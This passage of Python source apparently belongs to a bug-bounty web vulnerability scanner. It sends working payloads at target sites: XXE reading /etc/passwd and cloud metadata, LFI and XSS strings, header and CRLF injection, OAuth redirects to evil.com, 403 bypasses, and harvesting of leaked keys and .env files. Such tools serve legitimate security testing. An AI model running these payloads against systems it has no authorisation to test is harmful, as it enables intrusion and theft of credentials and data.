                                                "graphql", "query", "schema", "endpoint", "api",
                                                "token", "secret", "password", "email"]):
                        findings.append({"type": f"Exposed Endpoint: {path}", "severity": "high",
                                         "url": f"{base_url}{path}",
                                         "detail": f"Accessible without auth ({r.status_code}, {len(r.content)}b)",
                                         "template": "apex-auth"})
            except Exception:
                continue
    return findings


def scan_cors(crawl_data):
    """Test for CORS misconfiguration."""
    findings = []
    tested = set()
    requests_to_make = []  # (method, url, kwargs) for batch
    url_origin_map = {}  # track which origin goes with which request

    for target in crawl_data.get("pages", [])[:10]:
        url = target["url"]
        base = "/".join(url.split("/", 3)[:3])
        if base in tested:
            continue
        tested.add(base)
        for origin in ["https://evil.com", "null", f"{base}.evil.com"]:
            req_key = f"{url}|{origin}"
            url_origin_map[req_key] = (url, origin)
            requests_to_make.append(("GET", url, {"headers": {"Origin": origin}, "timeout": 5}))

    for req_url, r in batch_request(requests_to_make):
        if r is None:
            continue
        # Find which origin this was
        origin = r.request.headers.get("Origin", "") if hasattr(r, "request") else ""
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        if acao and acao != "*" and acac.lower() == "true":
            if acao in ("https://evil.com", "null") or acao.endswith(".evil.com"):
                findings.append({"type": "CORS Misconfiguration", "severity": "high",
                                 "url": req_url, "detail": f"Reflects origin {acao} with credentials",
                                 "template": "apex-cors"})
    return findings


# ---------------------------------------------------------------------------
# More advanced scanners — high-value bug classes
# ---------------------------------------------------------------------------

def scan_prototype_pollution(crawl_data):
    """Test for prototype pollution via query params."""
    findings = []
    for target in crawl_data.get("pages", [])[:5]:
        url = target["url"].split("?")[0]
        try:
            payload_url = f"{url}?__proto__[test]=polluted&constructor[prototype][test]=polluted"
            r = _S.get(payload_url, timeout=_TIMEOUT)
            if "polluted" in r.text and "__proto__" not in r.text:
                findings.append({"type": "Prototype Pollution", "severity": "high", "url": payload_url,
                                 "detail": "Reflected prototype pollution", "template": "apex-pp"})
        except: pass
    return findings


def scan_host_header_injection(crawl_data):
    """Test for host header injection."""
    findings = []
    tested = set()
    for target in crawl_data.get("pages", [])[:5]:
        base = "/".join(target["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r = _S.get(target["url"], timeout=_TIMEOUT, headers={"Host": "evil.com"}, allow_redirects=False)
            if "evil.com" in r.text or "evil.com" in r.headers.get("Location", ""):
                findings.append({"type": "Host Header Injection", "severity": "high", "url": target["url"],
                                 "detail": "Host header reflected/used in redirect", "template": "apex-hhi"})
        except: pass
        try:
            r = _S.get(target["url"], timeout=_TIMEOUT, headers={"X-Forwarded-Host": "evil.com"}, allow_redirects=False)
            if "evil.com" in r.text or "evil.com" in r.headers.get("Location", ""):
                findings.append({"type": "Host Header Injection (X-Forwarded-Host)", "severity": "high",
                                 "url": target["url"], "detail": "X-Forwarded-Host reflected", "template": "apex-hhi"})
        except: pass
    return findings


def scan_crlf_injection(crawl_data):
    """Test for CRLF injection in headers."""
    findings = []
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = ["test%0d%0aX-Injected: true"]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                r = _S.get(test_url, timeout=_TIMEOUT, allow_redirects=False)
                if "X-Injected" in str(r.headers):
                    findings.append({"type": "CRLF Injection", "severity": "high", "url": test_url,
                                     "detail": f"Header injection via {p}", "template": "apex-crlf"})
                    break
            except: continue
    return findings


def scan_jwt_issues(crawl_data):
    """Check for JWT misconfigurations."""
    findings = []
    tested = set()
    for target in crawl_data.get("pages", [])[:5]:
        base = "/".join(target["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        # Check common JWT endpoints
        for path in ["/api/auth", "/api/login", "/auth/token", "/oauth/token", "/api/v1/auth"]:
            try:
                r = _S.post(f"{base}{path}", json={"username":"test","password":"test"}, timeout=5)
                body = r.text
                # Check if response contains a JWT
                import re as _re
                jwts = _re.findall(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', body)
                if jwts:
                    # Try none algorithm
                    import base64
                    for jwt in jwts:
                        parts = jwt.split(".")
                        try:
                            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
                            if header.get("alg") == "none" or header.get("alg") == "HS256":
                                findings.append({"type": "JWT Weak Algorithm", "severity": "high",
                                                 "url": f"{base}{path}", "detail": f"JWT uses {header.get('alg')}",
                                                 "template": "apex-jwt"})
                        except: pass
            except: continue
    return findings


def scan_subdomain_takeover(subdomains):
    """Check for subdomain takeover opportunities."""
    if not subdomains:
        return []
    findings = []
    takeover_sigs = {
        "There isn't a GitHub Pages site here": "GitHub Pages",
        "NoSuchBucket": "AWS S3",
        "No such app": "Heroku",
        "NXDOMAIN": "Unclaimed",
        "The request could not be satisfied": "CloudFront",
        "Repository not found": "Bitbucket",
        "Sorry, this shop is currently unavailable": "Shopify",
        "The feed has not been found": "Feedpress",
        "project not found": "Surge.sh",
        "Fastly error: unknown domain": "Fastly",
    }
    for sub in subdomains[:50]:
        for proto in ["https", "http"]:
            try:
                r = _S.get(f"{proto}://{sub}", timeout=5, allow_redirects=True)
                for sig, service in takeover_sigs.items():
                    if sig in r.text:
                        findings.append({"type": f"Subdomain Takeover ({service})", "severity": "critical",
                                         "url": f"{proto}://{sub}", "detail": f"Dangling CNAME → {service}",
                                         "template": "apex-takeover"})
                        break
                break
            except requests.exceptions.ConnectionError:
                # NXDOMAIN or connection refused — check DNS
                try:
                    import socket
                    socket.getaddrinfo(sub, None)
                except socket.gaierror:
                    # Check if CNAME exists
                    try:
                        result = subprocess.run(["dig", "+short", "CNAME", sub], capture_output=True, text=True, timeout=5)
                        cname = (result.stdout or "").strip()
                        if cname and not cname.endswith(sub.split(".")[-2] + "."):
                            findings.append({"type": "Potential Subdomain Takeover", "severity": "high",
                                             "url": sub, "detail": f"CNAME {cname} but host unreachable",
                                             "template": "apex-takeover"})
                    except Exception: pass
                break
            except: break


# ---------------------------------------------------------------------------
# Elite scanners — the stuff that wins big bounties
# ---------------------------------------------------------------------------

def scan_api_keys_in_js(crawl_data):
    """Scan JavaScript files for leaked API keys, tokens, secrets."""
    findings = []
    patterns = {
        "AWS Key": r"AKIA[0-9A-Z]{16}",
        "Google API Key": r"AIza[0-9A-Za-z\-_]{35}",
        "Slack Token": r"xox[bpors]-[0-9a-zA-Z]{10,48}",
        "GitHub Token": r"gh[pousr]_[A-Za-z0-9_]{36,255}",
        "Private Key": r"-----BEGIN (RSA |EC )?PRIVATE KEY-----",
        "Stripe Key": r"sk_live_[0-9a-zA-Z]{24,}",
        "Twilio": r"SK[0-9a-fA-F]{32}",
        "Mailgun": r"key-[0-9a-zA-Z]{32}",
        "Firebase": r"AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}",
        "JWT Secret": r"['\"]?(?:jwt|JWT|secret|SECRET|api[_-]?key|API[_-]?KEY|token|TOKEN)['\"]?\s*[:=]\s*['\"][A-Za-z0-9+/=_-]{16,}['\"]",
        "Password in Code": r"['\"]?(?:password|passwd|pwd)['\"]?\s*[:=]\s*['\"][^'\"]{8,}['\"]",
        "Internal URL": r"https?://(?:localhost|127\.0\.0\.1|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+)[:/][^\s'\"]+",
    }
    js_urls = set()
    for page in crawl_data.get("pages", []):
        try:
            r = _S.get(page["url"], timeout=_TIMEOUT)
            soup = BeautifulSoup(r.text, "lxml")
            for script in soup.find_all("script", src=True):
                src = script["src"]
                if src.startswith("//"):
                    src = "https:" + src
                elif src.startswith("/"):
                    base = "/".join(page["url"].split("/", 3)[:3])
                    src = base + src
                if src.startswith("http"):
                    js_urls.add(src)
        except: pass
    for js_url in list(js_urls)[:30]:
        try:
            r = _S.get(js_url, timeout=_TIMEOUT)
            if len(r.content) > 5_000_000: continue
            for name, pattern in patterns.items():
                matches = re.findall(pattern, r.text)
                if matches:
                    sample = matches[0][:60] if isinstance(matches[0], str) else str(matches[0])[:60]
                    findings.append({"type": f"Leaked Secret: {name}", "severity": "critical",
                                     "url": js_url, "detail": f"Found: {sample}...",
                                     "template": "apex-secrets"})
        except: pass
    return findings


def scan_graphql(crawl_data):
    """Find and test GraphQL endpoints for introspection and injection."""
    findings = []
    tested = set()
    gql_paths = ["/graphql", "/graphql/v1", "/api/graphql", "/gql", "/query", "/graphiql"]
    introspection = {"query": "{__schema{types{name fields{name}}}}"}
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in gql_paths:
            try:
                r = _S.post(f"{base}{path}", json=introspection, timeout=5,
                           headers={"Content-Type": "application/json"})
                if "__schema" in r.text and "types" in r.text:
                    data = r.json()
                    type_names = [t["name"] for t in data.get("data",{}).get("__schema",{}).get("types",[])
                                  if not t["name"].startswith("__")]
                    sensitive = [t for t in type_names if any(x in t.lower() for x in
                                ["user","admin","auth","token","secret","password","payment","order","credit"])]
                    findings.append({"type": "GraphQL Introspection Enabled", "severity": "high",
                                     "url": f"{base}{path}",
                                     "detail": f"{len(type_names)} types exposed. Sensitive: {', '.join(sensitive[:5])}",
                                     "template": "apex-graphql"})
                    break
            except: continue
    return findings


def scan_rate_limit(crawl_data):
    """Check for missing rate limiting on auth endpoints."""
    findings = []
    tested = set()
    auth_paths = ["/login", "/api/login", "/auth", "/api/auth", "/signin", "/api/signin",
                  "/forgot-password", "/api/forgot-password", "/reset-password", "/api/v1/login"]
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in auth_paths:
            url = f"{base}{path}"
            try:
                blocked = False
                for i in range(15):
                    r = _S.post(url, json={"email":"test@test.com","password":"wrong"}, timeout=3)
                    if r.status_code == 429 or "rate" in r.text.lower() or "too many" in r.text.lower():
                        blocked = True
                        break
                if not blocked:
                    # Verify endpoint exists (not just 404)
                    if r.status_code < 404:
                        findings.append({"type": "Missing Rate Limit", "severity": "medium",
                                         "url": url, "detail": f"No rate limit after 15 requests ({r.status_code})",
                                         "template": "apex-ratelimit"})
            except: continue
    return findings


def scan_websocket(crawl_data):
    """Find WebSocket endpoints and check for auth issues."""
    findings = []
    for page in crawl_data.get("pages", [])[:10]:
        try:
            r = _S.get(page["url"], timeout=_TIMEOUT)
            ws_urls = re.findall(r'wss?://[^\s\'"<>]+', r.text)
            for ws in ws_urls:
                findings.append({"type": "WebSocket Endpoint Found", "severity": "low",
                                 "url": ws, "detail": f"Found in {page['url'][:60]}",
                                 "template": "apex-ws"})
        except: pass
    return findings


def scan_info_disclosure(crawl_data):
    """Check for information disclosure in error pages and headers."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        # Trigger errors
        error_urls = [f"{base}/'", f"{base}/{{{{", f"{base}/%00", f"{base}/..;/"]
        for url in error_urls:
            try:
                r = _S.get(url, timeout=5)
                body = r.text.lower()
                if any(x in body for x in ["stack trace", "traceback", "exception in", "syntax error",
                                            "fatal error", "debug mode", "django debug",
                                            "laravel", "at /var/www", "at /home/", "at c:\\"]):
                    findings.append({"type": "Debug/Stack Trace Exposed", "severity": "medium",
                                     "url": url, "detail": "Error page leaks internal info",
                                     "template": "apex-info"})
                    break
            except: continue
        # Check headers for version disclosure
        try:
            r = _S.get(base, timeout=5)
            for h in ["X-Powered-By", "Server", "X-AspNet-Version", "X-AspNetMvc-Version"]:
                v = r.headers.get(h, "")
                if v and any(c.isdigit() for c in v):
                    findings.append({"type": f"Version Disclosure: {h}", "severity": "low",
                                     "url": base, "detail": f"{h}: {v}", "template": "apex-info"})
        except: pass
    return findings


# ---------------------------------------------------------------------------
# JavaScript endpoint extraction + hidden API testing
# ---------------------------------------------------------------------------

def extract_js_endpoints(crawl_data):
    """Extract hidden API endpoints from JavaScript files and test them."""
    findings = []
    js_urls = set()
    base_url = None

    for page in crawl_data.get("pages", [])[:5]:
        if not base_url:
            base_url = "/".join(page["url"].split("/", 3)[:3])
        try:
            r = _S.get(page["url"], timeout=_TIMEOUT)
            soup = BeautifulSoup(r.text, "lxml")
            for s in soup.find_all("script", src=True):
                src = s["src"]
                if src.startswith("//"): src = "https:" + src
                elif src.startswith("/"): src = base_url + src
                elif not src.startswith("http"): src = base_url + "/" + src
                js_urls.add(src)
            # Inline scripts too
            for s in soup.find_all("script", src=False):
                if s.string and len(s.string) > 100:
                    _extract_from_js(s.string, base_url, findings)
        except: pass

    # Fetch and parse external JS
    for js_url in list(js_urls)[:20]:
        try:
            r = _S.get(js_url, timeout=_TIMEOUT)
            if len(r.content) > 5_000_000: continue
            _extract_from_js(r.text, base_url, findings)
        except: pass

    # Deduplicate and test discovered endpoints
    seen = set()
    tested_findings = []
    for f in findings:
        if f["url"] not in seen:
            seen.add(f["url"])
            tested_findings.append(f)

    return tested_findings


def _extract_from_js(js_text, base_url, findings):
    """Extract endpoints from JS source and test them."""
    # Find API paths
    api_patterns = [
        re.compile(r'["\'](/api/[a-zA-Z0-9/_\-\.]+)["\']'),
        re.compile(r'["\'](/v[0-9]+/[a-zA-Z0-9/_\-\.]+)["\']'),
        re.compile(r'["\'](/graphql[a-zA-Z0-9/_\-\.]*)["\']'),
        re.compile(r'["\'](/internal/[a-zA-Z0-9/_\-\.]+)["\']'),
        re.compile(r'["\'](/admin/[a-zA-Z0-9/_\-\.]+)["\']'),
        re.compile(r'["\'](/debug/[a-zA-Z0-9/_\-\.]+)["\']'),
        re.compile(r'["\'](/private/[a-zA-Z0-9/_\-\.]+)["\']'),
        re.compile(r'fetch\(["\']([^"\']+)["\']'),
        re.compile(r'axios\.[a-z]+\(["\']([^"\']+)["\']'),
        re.compile(r'\.ajax\(\{[^}]*url:\s*["\']([^"\']+)["\']'),
        re.compile(r'XMLHttpRequest[^;]*open\([^,]*,\s*["\']([^"\']+)["\']'),
    ]

    endpoints = set()
    for pattern in api_patterns:
        for match in pattern.findall(js_text):
            if match.startswith("/") and len(match) > 3 and not match.endswith((".js", ".css", ".png", ".jpg", ".svg")):
                endpoints.add(match)
            elif match.startswith("http") and "/api" in match:
                endpoints.add(match)

    # Test each discovered endpoint
    for ep in list(endpoints)[:30]:
        url = ep if ep.startswith("http") else f"{base_url}{ep}"
        try:
            r = _S.get(url, timeout=5, allow_redirects=False)
            if r.status_code == 200:
                body = r.text[:500].lower()
                ctype = r.headers.get("content-type", "").lower()
                # Real API response (JSON, not HTML error page)
                if "application/json" in ctype or (body.startswith("{") or body.startswith("[")):
                    try:
                        data = r.json()
                        # Check if it returns actual data without auth
                        if isinstance(data, (dict, list)) and len(str(data)) > 20:
                            has_sensitive = any(k in str(data).lower() for k in
                                              ["email", "user", "token", "password", "secret", "key",
                                               "admin", "phone", "address", "ssn", "credit"])
                            if has_sensitive:
                                findings.append({"type": "Unauthenticated API with Sensitive Data",
                                                 "severity": "critical", "url": url,
                                                 "detail": f"Returns JSON with sensitive fields ({len(str(data))}b)",
                                                 "template": "apex-hidden-api"})
                            else:
                                findings.append({"type": "Hidden API Endpoint (No Auth)",
                                                 "severity": "medium", "url": url,
                                                 "detail": f"Accessible API found in JS ({len(str(data))}b)",
                                                 "template": "apex-hidden-api"})
                    except: pass
        except: pass

    # Find hardcoded config objects
    config_patterns = [
        re.compile(r'(?:config|CONFIG|env|ENV)\s*[=:]\s*\{([^}]{50,500})\}'),
        re.compile(r'(?:firebase|FIREBASE)[^{]*\{([^}]{30,300})\}'),
    ]
    for pattern in config_patterns:
        for match in pattern.findall(js_text):
            if any(x in match.lower() for x in ["key", "secret", "token", "password", "apikey"]):
                findings.append({"type": "Hardcoded Config in JS", "severity": "high",
                                 "url": base_url, "detail": f"Config: {match[:100]}...",
                                 "template": "apex-secrets"})


# ---------------------------------------------------------------------------
# Wayback Machine recon + parameter bruteforce + 403 bypass
# ---------------------------------------------------------------------------

def scan_wayback(target):
    """Pull old URLs from Wayback Machine — find forgotten endpoints."""
    findings = []
    try:
        r = requests.get(f"https://web.archive.org/cdx/search/cdx?url=*.{target}/*&output=text&fl=original&collapse=urlkey&limit=500", timeout=15)
        urls = set()
        for line in r.text.splitlines():
            line = line.strip()
            if any(x in line for x in [".js", ".json", "/api/", "/admin", "/internal", "/debug",
                                        "/config", "/backup", "/test", "/staging", "/dev",
                                        ".env", ".git", "token", "auth", "graphql", "swagger"]):
                urls.add(line)
        # Test if old URLs still work
        for url in list(urls)[:40]:
            try:
                resp = _S.get(url, timeout=5, allow_redirects=False)
                if resp.status_code == 200 and len(resp.content) > 50:
                    ctype = resp.headers.get("content-type", "").lower()
                    if "json" in ctype or "javascript" in ctype or "text/plain" in ctype:
                        findings.append({"type": "Wayback: Forgotten Endpoint", "severity": "high",
                                         "url": url, "detail": f"Old URL still live ({resp.status_code}, {len(resp.content)}b)",
                                         "template": "apex-wayback"})
                    elif any(x in url.lower() for x in [".env", "config", "admin", "debug", "backup", "token"]):
                        findings.append({"type": "Wayback: Sensitive Path", "severity": "medium",
                                         "url": url, "detail": f"Historical sensitive URL still responds",
                                         "template": "apex-wayback"})
            except: continue
    except: pass
    return findings


def scan_param_bruteforce(crawl_data):
    """Bruteforce hidden parameters on endpoints."""
    findings = []
    params = ["id", "user_id", "uid", "admin", "debug", "test", "token", "api_key", "key",
              "secret", "password", "redirect", "url", "next", "return", "callback", "jsonp",
              "file", "path", "dir", "page", "template", "include", "lang", "action", "cmd",
              "exec", "query", "search", "email", "username", "role", "type", "format", "output",
              "v", "version", "access_token", "auth", "session", "internal", "source", "ref"]

    for page in crawl_data.get("pages", [])[:5]:
        url = page["url"].split("?")[0]
        try:
            baseline = _S.get(url, timeout=5)
            base_len = len(baseline.content)
        except: continue

        for p in params:
            try:
                r = _S.get(f"{url}?{p}=1", timeout=3)
                diff = abs(len(r.content) - base_len)
                if diff > 100 and r.status_code == 200:
                    # Check if param actually does something
                    r2 = _S.get(f"{url}?{p}=../../etc/passwd", timeout=3)
                    r3 = _S.get(f"{url}?{p}=<script>x</script>", timeout=3)
                    if "root:" in r2.text:
                        findings.append({"type": f"Hidden Param LFI: {p}", "severity": "critical",
                                         "url": f"{url}?{p}=../../etc/passwd",
                                         "detail": f"Param {p} vulnerable to LFI", "template": "apex-param"})
                    elif "<script>x</script>" in r3.text:
                        findings.append({"type": f"Hidden Param XSS: {p}", "severity": "high",
                                         "url": f"{url}?{p}=<script>x</script>",
                                         "detail": f"Param {p} reflects input (XSS)", "template": "apex-param"})
                    elif diff > 500:
                        findings.append({"type": f"Hidden Parameter: {p}", "severity": "low",
                                         "url": f"{url}?{p}=1",
                                         "detail": f"Param changes response by {diff}b", "template": "apex-param"})
            except: continue
    return findings


def scan_403_bypass(crawl_data):
    """Try to bypass 403 forbidden pages."""
    findings = []
    forbidden = []
    tested = set()

    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/admin", "/api/admin", "/internal", "/debug", "/management", "/console",
                     "/actuator", "/swagger", "/graphql", "/api/v1/users"]:
            try:
                r = _S.get(f"{base}{path}", timeout=3)
                if r.status_code == 403:
                    forbidden.append((base, path))
            except: pass

    bypasses = [
        lambda b,p: _S.get(f"{b}{p}/", timeout=3),
        lambda b,p: _S.get(f"{b}{p}..;/", timeout=3),
        lambda b,p: _S.get(f"{b}{p}%2e/", timeout=3),
        lambda b,p: _S.get(f"{b}{p}", timeout=3, headers={"X-Original-URL": p}),
        lambda b,p: _S.get(f"{b}{p}", timeout=3, headers={"X-Rewrite-URL": p}),
        lambda b,p: _S.get(f"{b}{p}", timeout=3, headers={"X-Forwarded-For": "127.0.0.1"}),
        lambda b,p: _S.get(f"{b}{p}", timeout=3, headers={"X-Custom-IP-Authorization": "127.0.0.1"}),
        lambda b,p: _S.get(f"{b}/{p.lstrip('/')}", timeout=3, headers={"Content-Length": "0"}, allow_redirects=False),
        lambda b,p: _S.get(f"{b}{p}%00", timeout=3),
        lambda b,p: _S.get(f"{b}{p}#", timeout=3),
        lambda b,p: _S.get(f"{b}{p}?", timeout=3),
    ]

    for base, path in forbidden[:10]:
        for i, bypass in enumerate(bypasses):
            try:
                r = bypass(base, path)
                if r.status_code == 200 and len(r.content) > 100:
                    findings.append({"type": f"403 Bypass: {path}", "severity": "high",
                                     "url": f"{base}{path}", "detail": f"Bypass method #{i+1} returned 200",
                                     "template": "apex-403bypass"})
                    break
            except: continue
    return findings


# ---------------------------------------------------------------------------
# OAuth/SSO, XXE, Deserialization, Business Logic
# ---------------------------------------------------------------------------

def scan_oauth_issues(crawl_data):
    """Test OAuth/SSO flows for common misconfigurations."""
    findings = []
    tested = set()
    oauth_paths = ["/oauth/authorize", "/oauth2/authorize", "/auth/oauth", "/connect/authorize",
                   "/login/oauth", "/sso", "/saml/login", "/.well-known/openid-configuration"]
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in oauth_paths:
            try:
                r = _S.get(f"{base}{path}", timeout=5, allow_redirects=False)
                if r.status_code in (200, 302):
                    loc = r.headers.get("Location", "")
                    # Check for open redirect in redirect_uri
                    if "redirect_uri" in loc or "redirect_uri" in r.text:
                        test = f"{base}{path}?client_id=test&redirect_uri=https://evil.com&response_type=code"
                        r2 = _S.get(test, timeout=5, allow_redirects=False)
                        if "evil.com" in r2.headers.get("Location", ""):
                            findings.append({"type": "OAuth Open Redirect", "severity": "critical",
                                             "url": test, "detail": "redirect_uri not validated",
                                             "template": "apex-oauth"})
                    # Check for state param missing (CSRF)
                    if "code=" in loc and "state=" not in loc:
                        findings.append({"type": "OAuth Missing State (CSRF)", "severity": "high",
                                         "url": f"{base}{path}", "detail": "No state param = CSRF possible",
                                         "template": "apex-oauth"})
                    if r.status_code == 200:
                        findings.append({"type": f"OAuth Endpoint Found: {path}", "severity": "low",
                                         "url": f"{base}{path}", "detail": "OAuth endpoint accessible",
                                         "template": "apex-oauth"})
            except: continue
    return findings


def scan_xxe(crawl_data):
    """Test XML endpoints for XXE injection."""
    findings = []
    xxe_payload = """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"""
    xxe_ssrf = """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>"""

    for page in crawl_data.get("pages", [])[:5]:
        url = page["url"]
        # Test forms that might accept XML
        for form in crawl_data.get("forms", []):
            if form.get("method", "").upper() == "POST":
                action = form.get("action", url)
                if not action.startswith("http"):
                    base = "/".join(url.split("/", 3)[:3])
                    action = base + action
                try:
                    r = _S.post(action, data=xxe_payload,
                               headers={"Content-Type": "application/xml"}, timeout=5)
                    if "root:" in r.text or "daemon:" in r.text:
                        findings.append({"type": "XXE Injection", "severity": "critical",
                                         "url": action, "detail": "XXE reads /etc/passwd",
                                         "template": "apex-xxe"})
                    elif "ami-id" in r.text or "instance-id" in r.text:
                        findings.append({"type": "XXE SSRF (Cloud Metadata)", "severity": "critical",
                                         "url": action, "detail": "XXE reaches cloud metadata",
                                         "template": "apex-xxe"})
                except: pass
        # Test JSON endpoints that might also accept XML
        for path in ["/api/upload", "/api/import", "/api/parse", "/api/xml", "/upload"]:
            base = "/".join(url.split("/", 3)[:3])
            try:
                r = _S.post(f"{base}{path}", data=xxe_payload,
                           headers={"Content-Type": "application/xml"}, timeout=5)
                if "root:" in r.text or "ami-id" in r.text:
                    findings.append({"type": "XXE Injection", "severity": "critical",
                                     "url": f"{base}{path}", "detail": "XXE confirmed",
                                     "template": "apex-xxe"})
            except: pass
    return findings


def scan_business_logic(crawl_data):
    """Test for business logic vulnerabilities — price manipulation, negative values, etc."""
    findings = []
    for page in crawl_data.get("pages", []):
        url = page["url"]
        # Look for price/quantity/amount params
        for param, val in urllib.parse.parse_qs(urllib.parse.urlparse(url).query).items():
            if any(x in param.lower() for x in ["price", "amount", "qty", "quantity", "total", "cost", "discount"]):
                try:
                    # Test negative values
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[param] = ["-1"]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=5)
                    if r.status_code == 200 and "error" not in r.text.lower():
                        findings.append({"type": f"Business Logic: Negative {param}", "severity": "high",
                                         "url": test_url, "detail": f"Negative value accepted for {param}",
                                         "template": "apex-logic"})
                    # Test zero
                    qs[param] = ["0"]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=5)
                    if r.status_code == 200 and "error" not in r.text.lower():
                        findings.append({"type": f"Business Logic: Zero {param}", "severity": "medium",
                                         "url": test_url, "detail": f"Zero value accepted for {param}",
                                         "template": "apex-logic"})
                except: pass
    return findings


def scan_cache_poisoning(crawl_data):
    """Test for web cache poisoning."""
    findings = []
    tested = set()
    poison_headers = [
        ("X-Forwarded-Host", "evil.com"),
        ("X-Forwarded-Scheme", "nothttps"),
        ("X-Original-URL", "/evil"),
        ("X-Rewrite-URL", "/evil"),
        ("X-Forwarded-Port", "1337"),
    ]
    for page in crawl_data.get("pages", [])[:5]:
        url = page["url"]
        base = "/".join(url.split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            baseline = _S.get(url, timeout=5)
            for header, value in poison_headers:
                r = _S.get(url, timeout=5, headers={header: value})
                if value in r.text and value not in baseline.text:
                    findings.append({"type": f"Cache Poisoning via {header}", "severity": "high",
                                     "url": url, "detail": f"{header}: {value} reflected in response",
                                     "template": "apex-cache"})
        except: pass
    return findings


# ---------------------------------------------------------------------------
# Smart context-aware scanning — adapts to what it finds
# ---------------------------------------------------------------------------

def scan_smart(crawl_data, technologies, web_targets):
    """Adapt scan based on detected tech stack."""
    findings = []
    pages = crawl_data.get("pages", [])
    if not pages: return findings
    base = "/".join(pages[0]["url"].split("/", 3)[:3])
    tech = " ".join(technologies).lower()

    # WordPress-specific
    if "wordpress" in tech or "wp-" in str(pages):
        wp_paths = ["/wp-json/wp/v2/users", "/wp-json/wp/v2/posts?per_page=100",
                    "/wp-config.php.bak", "/wp-content/debug.log", "/?author=1"]
        for path in wp_paths:
            try:
                r = _S.get(f"{base}{path}", timeout=5)
                if r.status_code == 200 and len(r.content) > 50:
                    if "email" in r.text or "slug" in r.text:
                        findings.append({"type": "WordPress User Enumeration", "severity": "medium",
                                         "url": f"{base}{path}", "detail": "User data exposed via REST API",
                                         "template": "apex-wp"})
                    elif "DB_PASSWORD" in r.text or "DB_HOST" in r.text:
                        findings.append({"type": "WordPress Config Exposed", "severity": "critical",
                                         "url": f"{base}{path}", "detail": "wp-config.php backup accessible",
                                         "template": "apex-wp"})
            except: pass

    # Spring Boot / Java
    if any(x in tech for x in ["spring", "java", "tomcat", "actuator"]):
        spring_paths = ["/actuator", "/actuator/env", "/actuator/heapdump",
                        "/actuator/mappings", "/actuator/beans", "/actuator/httptrace",
                        "/env", "/health", "/metrics", "/dump", "/trace"]
        for path in spring_paths:
            try:
                r = _S.get(f"{base}{path}", timeout=5)
                if r.status_code == 200:
                    body = r.text.lower()
                    if any(x in body for x in ["password", "secret", "key", "token", "datasource"]):
                        findings.append({"type": f"Spring Boot Actuator: {path}", "severity": "critical",
                                         "url": f"{base}{path}", "detail": "Sensitive data in actuator endpoint",
                                         "template": "apex-spring"})
                    elif "heapdump" in path:
                        findings.append({"type": "Spring Boot Heap Dump", "severity": "critical",
                                         "url": f"{base}{path}", "detail": "Memory dump accessible — contains secrets",
                                         "template": "apex-spring"})
            except: pass

    # Django / Python
    if any(x in tech for x in ["django", "python", "flask"]):
        for path in ["/admin/", "/__debug__/", "/api/schema/", "/api/docs/"]:
            try:
                r = _S.get(f"{base}{path}", timeout=5)
                if r.status_code == 200 and ("django" in r.text.lower() or "debug" in r.text.lower()):
                    findings.append({"type": f"Django Debug/Admin: {path}", "severity": "high",
                                     "url": f"{base}{path}", "detail": "Django admin or debug accessible",
                                     "template": "apex-django"})
            except: pass

    # Laravel / PHP
    if any(x in tech for x in ["laravel", "php", "symfony"]):
        for path in ["/.env", "/storage/logs/laravel.log", "/phpinfo.php",
                     "/telescope", "/horizon", "/api/documentation"]:
            try:
                r = _S.get(f"{base}{path}", timeout=5)
                if r.status_code == 200 and len(r.content) > 100:
                    if "APP_KEY" in r.text or "DB_PASSWORD" in r.text:
                        findings.append({"type": "Laravel .env Exposed", "severity": "critical",
                                         "url": f"{base}{path}", "detail": "Laravel .env with secrets accessible",
                                         "template": "apex-laravel"})
                    elif "laravel.log" in path and len(r.content) > 1000:
                        findings.append({"type": "Laravel Log Exposed", "severity": "high",
                                         "url": f"{base}{path}", "detail": f"Log file ({len(r.content)}b) accessible",
                                         "template": "apex-laravel"})
            except: pass

    # Node.js / Express
    if any(x in tech for x in ["node", "express", "next.js", "nuxt"]):
        for path in ["/.env", "/api/health", "/api/status", "/_next/static/chunks/",
                     "/node_modules/.bin/", "/package.json", "/.git/config"]:
            try:
                r = _S.get(f"{base}{path}", timeout=5)
                if r.status_code == 200:
                    if "dependencies" in r.text or "scripts" in r.text:
                        findings.append({"type": "package.json Exposed", "severity": "medium",
                                         "url": f"{base}{path}", "detail": "Node.js package.json accessible",
                                         "template": "apex-node"})
            except: pass

    # AWS / Cloud
